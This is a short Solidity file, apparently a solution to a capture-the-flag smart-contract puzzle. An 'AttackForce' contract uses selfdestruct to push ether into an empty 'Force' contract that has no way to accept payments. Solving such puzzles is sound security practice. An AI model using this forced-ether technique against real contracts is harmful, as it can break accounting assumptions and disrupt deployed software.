// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract AttackForce {
    Force force;

    function attack(address _force) public {
        force = Force(_force);

        selfdestruct(payable((address(force))));
    }

    receive() external payable {}
}
